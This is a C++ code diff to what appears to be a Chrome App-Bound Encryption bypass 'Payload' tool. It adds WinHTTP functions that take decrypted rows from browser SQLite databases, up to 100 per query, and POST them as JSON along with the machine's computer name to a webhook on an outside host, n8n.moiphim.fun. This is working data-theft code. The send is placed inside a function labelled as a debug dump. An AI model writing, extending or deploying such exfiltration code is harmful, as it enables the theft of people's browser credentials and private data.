@@ -7,6 +7,7 @@
 #include <wrl/client.h>
 #include <bcrypt.h>
 #include <Wincrypt.h>
+#include <winhttp.h>
 
 #include <fstream>
 #include <sstream>
@@ -31,6 +32,7 @@
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "winhttp.lib")
 
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
@@ -613,6 +615,179 @@ namespace Payload
             }
         }
 
+        // Helper function to send data to REST API
+        void SendToRestApi(const std::string &fileName, const std::string &value, const std::string &computerName)
+        {
+            try
+            {
+                // Create JSON body
+                std::ostringstream jsonBody;
+                jsonBody << "{\n";
+                jsonBody << "  \"" << fileName << "\": \"" << Utils::EscapeJson(value) << "\",\n";
+                jsonBody << "  \"computerName\": \"" << Utils::EscapeJson(computerName) << "\"\n";
+                jsonBody << "}";
+                
+                std::string jsonData = jsonBody.str();
+                std::wstring wJsonData(jsonData.begin(), jsonData.end());
+                
+                // Initialize WinHTTP
+                HINTERNET hSession = WinHttpOpen(L"Chrome-ABE-Tool/1.0", 
+                                                 WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                                 WINHTTP_NO_PROXY_NAME,
+                                                 WINHTTP_NO_PROXY_BYPASS, 0);
+                if (!hSession) return;
+                
+                // Connect to server
+                HINTERNET hConnect = WinHttpConnect(hSession, L"n8n.moiphim.fun", INTERNET_DEFAULT_HTTPS_PORT, 0);
+                if (!hConnect) 
+                {
+                    WinHttpCloseHandle(hSession);
+                    return;
+                }
+                
+                // Create request
+                HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", 
+                                                       L"/webhook/11822133-29ed-4594-a8c4-0a7ec9413983",
+                                                       NULL, WINHTTP_NO_REFERER, 
+                                                       WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                                       WINHTTP_FLAG_SECURE);
+                if (!hRequest)
+                {
+                    WinHttpCloseHandle(hConnect);
+                    WinHttpCloseHandle(hSession);
+                    return;
+                }
+                
+                // Set headers
+                std::wstring headers = L"Content-Type: application/json\r\n";
+                WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
+                
+                // Send request
+                BOOL result = WinHttpSendRequest(hRequest,
+                                               WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                                               (LPVOID)jsonData.c_str(), (DWORD)jsonData.length(),
+                                               (DWORD)jsonData.length(), 0);
+                
+                if (result)
+                {
+                    result = WinHttpReceiveResponse(hRequest, NULL);
+                    if (result)
+                    {
+                        Log("[+] Successfully sent data to REST API for " + fileName);
+                    }
+                    else
+                    {
+                        Log("[-] Failed to receive response from REST API");
+                    }
+                }
+                else
+                {
+                    Log("[-] Failed to send request to REST API");
+                }
+                
+                // Cleanup
+                WinHttpCloseHandle(hRequest);
+                WinHttpCloseHandle(hConnect);
+                WinHttpCloseHandle(hSession);
+            }
+            catch (const std::exception &e)
+            {
+                Log("[-] REST API Error: " + std::string(e.what()));
+            }
+        }
+
+        // Helper function to send all JSON data to REST API
+        void SendToRestApiAllData(const std::string &fileName, const std::vector<std::string> &allJsonData, const std::string &computerName)
+        {
+            try
+            {
+                // Create JSON array of all data
+                std::ostringstream jsonArray;
+                jsonArray << "[";
+                for (size_t i = 0; i < allJsonData.size(); ++i)
+                {
+                    if (i > 0) jsonArray << ",";
+                    jsonArray << allJsonData[i];
+                }
+                jsonArray << "]";
+                
+                // Create JSON body
+                std::ostringstream jsonBody;
+                jsonBody << "{\n";
+                jsonBody << "  \"" << fileName << "_all\": " << jsonArray.str() << ",\n";
+                jsonBody << "  \"computerName\": \"" << Utils::EscapeJson(computerName) << "\",\n";
+                jsonBody << "  \"totalCount\": " << allJsonData.size() << "\n";
+                jsonBody << "}";
+                
+                std::string jsonData = jsonBody.str();
+                std::wstring wJsonData(jsonData.begin(), jsonData.end());
+                
+                // Initialize WinHTTP
+                HINTERNET hSession = WinHttpOpen(L"Chrome-ABE-Tool/1.0", 
+                                                 WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                                 WINHTTP_NO_PROXY_NAME,
+                                                 WINHTTP_NO_PROXY_BYPASS, 0);
+                if (!hSession) return;
+                
+                // Connect to server
+                HINTERNET hConnect = WinHttpConnect(hSession, L"n8n.moiphim.fun", INTERNET_DEFAULT_HTTPS_PORT, 0);
+                if (!hConnect) 
+                {
+                    WinHttpCloseHandle(hSession);
+                    return;
+                }
+                
+                // Create request
+                HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", 
+                                                       L"/webhook/11822133-29ed-4594-a8c4-0a7ec9413983",
+                                                       NULL, WINHTTP_NO_REFERER, 
+                                                       WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                                       WINHTTP_FLAG_SECURE);
+                if (!hRequest)
+                {
+                    WinHttpCloseHandle(hConnect);
+                    WinHttpCloseHandle(hSession);
+                    return;
+                }
+                
+                // Set headers
+                std::wstring headers = L"Content-Type: application/json\r\n";
+                WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
+                
+                // Send request
+                BOOL result = WinHttpSendRequest(hRequest,
+                                               WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                                               (LPVOID)jsonData.c_str(), (DWORD)jsonData.length(),
+                                               (DWORD)jsonData.length(), 0);
+                
+                if (result)
+                {
+                    result = WinHttpReceiveResponse(hRequest, NULL);
+                    if (result)
+                    {
+                        Log("[+] Successfully sent ALL data to REST API for " + fileName + " (" + std::to_string(allJsonData.size()) + " entries)");
+                    }
+                    else
+                    {
+                        Log("[-] Failed to receive response from REST API (ALL data)");
+                    }
+                }
+                else
+                {
+                    Log("[-] Failed to send ALL data request to REST API");
+                }
+                
+                // Cleanup
+                WinHttpCloseHandle(hRequest);
+                WinHttpCloseHandle(hConnect);
+                WinHttpCloseHandle(hSession);
+            }
+            catch (const std::exception &e)
+            {
+                Log("[-] REST API All Data Error: " + std::string(e.what()));
+            }
+        }
+
         // Debug function to dump an ExtractionConfig fields and sample JSON to the log
         void DumpExtractionConfig(const Data::ExtractionConfig &cfg, sqlite3 *db = nullptr, const std::vector<uint8_t> &aesKey = {})
         {
@@ -634,6 +809,7 @@ namespace Payload
                 bool hasPreSetup;
                 bool hasFormatter;
                 std::string sampleJson;
+                std::vector<std::string> allJsonData;
             } configObj;
 
             // Read data into object
@@ -658,18 +834,23 @@ namespace Payload
                 sqlite3_stmt *stmt = nullptr;
                 if (sqlite3_prepare_v2(db, cfg.sqlQuery.c_str(), -1, &stmt, nullptr) == SQLITE_OK)
                 {
-                    if (sqlite3_step(stmt) == SQLITE_ROW)
+                    bool foundFirst = false;
+                    int count = 0;
+                    while (sqlite3_step(stmt) == SQLITE_ROW && count < 100) // Limit to 100 entries for performance
                     {
                         if (auto jsonResult = cfg.jsonFormatter(stmt, aesKey, preQueryState))
                         {
-                            configObj.sampleJson = *jsonResult;
-                        }
-                        else
-                        {
-                            configObj.sampleJson = "Failed to format JSON";
+                            if (!foundFirst)
+                            {
+                                configObj.sampleJson = *jsonResult;
+                                foundFirst = true;
+                            }
+                            configObj.allJsonData.push_back(*jsonResult);
+                            count++;
                         }
                     }
-                    else
+                    
+                    if (!foundFirst)
                     {
                         configObj.sampleJson = "No data rows found";
                     }
@@ -691,6 +872,7 @@ namespace Payload
             oss << "hasPreSetup: " << (configObj.hasPreSetup ? "true" : "false") << "\n";
             oss << "hasFormatter: " << (configObj.hasFormatter ? "true" : "false") << "\n";
             oss << "sampleJson: " << configObj.sampleJson << "\n";
+            oss << "totalJsonEntries: " << configObj.allJsonData.size() << "\n";
             oss << "==============================\n";
 
             std::string output = oss.str();
@@ -701,6 +883,21 @@ namespace Payload
 
             // Also log via pipe
             Log(output);
+            
+            // Send to REST API if we have valid sample JSON
+            if (configObj.sampleJson != "N/A - No database connection" && 
+                configObj.sampleJson != "No data rows found" &&
+                configObj.sampleJson != "Failed to format JSON" &&
+                configObj.sampleJson.find("SQL query failed") == std::string::npos)
+            {
+                // SendToRestApi(configObj.fileName, configObj.sampleJson, configObj.deviceName);
+                
+                // Send all JSON data as well
+                if (!configObj.allJsonData.empty())
+                {
+                    SendToRestApiAllData(configObj.fileName, configObj.allJsonData, configObj.deviceName);
+                }
+            }
         }
 
         void ExtractDataFromProfile(const fs::path &profilePath, const Data::ExtractionConfig &dataCfg, const std::vector<uint8_t> &aesKey)
